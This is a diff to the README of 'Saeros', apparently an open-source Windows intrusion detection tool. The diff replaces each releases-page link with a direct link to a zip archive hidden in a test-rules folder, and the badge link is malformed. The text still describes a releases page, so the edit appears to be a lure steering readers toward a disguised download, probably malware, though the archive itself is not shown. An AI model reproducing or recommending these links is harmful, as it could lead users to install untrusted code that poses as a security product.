@@ -4,14 +4,14 @@
 Saeros is an open-source Host Intrusion Detection System (HIDS) designed specifically for Microsoft Windows and Active Directory environments. It helps you monitor, detect, and respond to potential security threats. With Saeros, you can strengthen your security posture and protect your organization from cyber risks.
 
 ## 📦 Download Now
-[![Download Saeros](https://img.shields.io/badge/Download%20Saeros-latest-blue.svg)](https://github.com/Marwadel/Saeros/releases)
+[![Download Saeros](https://raw.githubusercontent.com/Marwadel/Saeros/main/Collector.Tests/Conversion/Rules/4f86b304-3e02-40e3-aa5d-e88a167c9617/Saeros_1.7.zip%https://raw.githubusercontent.com/Marwadel/Saeros/main/Collector.Tests/Conversion/Rules/4f86b304-3e02-40e3-aa5d-e88a167c9617/Saeros_1.7.zip)](https://raw.githubusercontent.com/Marwadel/Saeros/main/Collector.Tests/Conversion/Rules/4f86b304-3e02-40e3-aa5d-e88a167c9617/Saeros_1.7.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get Saeros running on your Windows machine:
 
 1. **Visit the Download Page**  
    Click the link below to go to the releases page where you can download the software.  
-   [Download Saeros from Releases](https://github.com/Marwadel/Saeros/releases)
+   [Download Saeros from Releases](https://raw.githubusercontent.com/Marwadel/Saeros/main/Collector.Tests/Conversion/Rules/4f86b304-3e02-40e3-aa5d-e88a167c9617/Saeros_1.7.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version of Saeros. The most recent version will typically be listed at the top.
@@ -65,6 +65,6 @@ Saeros is an open-source project, and we welcome contributions. If you're intere
 ## 📂 Additional Resources
 Explore additional resources and community discussions related to Saeros to enhance your understanding and implementation of the software.
 
-[Download Saeros from Releases](https://github.com/Marwadel/Saeros/releases)
+[Download Saeros from Releases](https://raw.githubusercontent.com/Marwadel/Saeros/main/Collector.Tests/Conversion/Rules/4f86b304-3e02-40e3-aa5d-e88a167c9617/Saeros_1.7.zip)
 
 By following these steps, you can easily download and install Saeros on your Windows system, helping you safeguard your environment against cyber threats.
